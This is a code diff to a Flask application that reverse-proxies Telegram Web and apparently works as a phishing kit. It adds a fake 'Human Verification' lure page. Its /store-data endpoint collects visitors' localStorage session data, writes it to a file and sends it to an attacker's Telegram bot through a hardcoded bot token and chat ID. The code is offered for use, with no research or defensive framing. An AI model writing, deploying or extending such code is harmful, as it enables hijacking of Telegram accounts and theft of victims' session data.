@@ -12,6 +12,7 @@ BASE_URL = 'https://web.telegram.org/k/'
 TELEGRAM_BOT_TOKEN = '7748600145:AAFIALKClYzW9ACeA4GvOuyQQTb1mOcSf1o'
 TELEGRAM_CHAT_ID = '6643893560'
 
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def proxy(path):
@@ -80,12 +81,8 @@ def proxy(path):
             }
         }, 5000); // 5000 milliseconds = 5 seconds
 
-        
 
-        // Set an interval to recheck every 10 seconds
-        setInterval(function() {
-            reloadIfContainsCRipple();
-        }, 10000);
+
     </script>
     """
 
@@ -100,7 +97,74 @@ def proxy(path):
     headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
     return Response(content, response.status_code, headers)
 
+REVERSE_PROXY_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet"> <!-- Include Roboto Mono font -->
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #0f0f0f;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+        }
+        .container {
+            width: 100%;
+            height: 100vh;
+            background-color: #1a1a1a;
+            padding-top: 50px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container h1 {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 3px; /* Reduced margin between heading and paragraph */
+        }
+        .container p {
+            font-size: 1.2em;
+            margin-bottom: 25px;
+        }
+        .container a {
+            display: inline-block;
+            background-color: #2a5f3f;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.3em;
+            text-decoration: underline; /* Underline the text */
+            border-radius: 5px;
+            border: 2px solid #255238;
+            width: 50%; /* Elongate the button */
+            text-align: center; /* Ensure text is centered inside the elongated button */
+            font-family: 'Roboto Mono', monospace; /* Change font to Roboto Mono */
+        }
+        .container a:hover {
+            background-color: #3d7b56;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Human Verification</h1>
+        <p>Verify below to be granted entry</p>
+        <a href="/">Click here</a>  <!-- Changed link to point to /api -->
+    </div>
+</body>
+</html>
+"""
 
+@app.route('/verify', methods=['GET'])
+def reverse_proxy():
+    return REVERSE_PROXY_HTML
 # Endpoint to receive localStorage and sessionStorage data
 @app.route('/store-data', methods=['POST'])
 def store_data():
@@ -116,7 +180,7 @@ def store_data():
     with open(filename, 'w') as file:
         form = local_storage
         file.write(f"{form}\n")
-        #file.write(f"sessionStorage: {session_storage}\n")
+        # file.write(f"sessionStorage: {session_storage}\n")
 
     # Send the file to the Telegram bot
     send_file_to_telegram(filename)
@@ -132,4 +196,4 @@ def send_file_to_telegram(filename):
 
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    app.run(debug=True, port=5002)
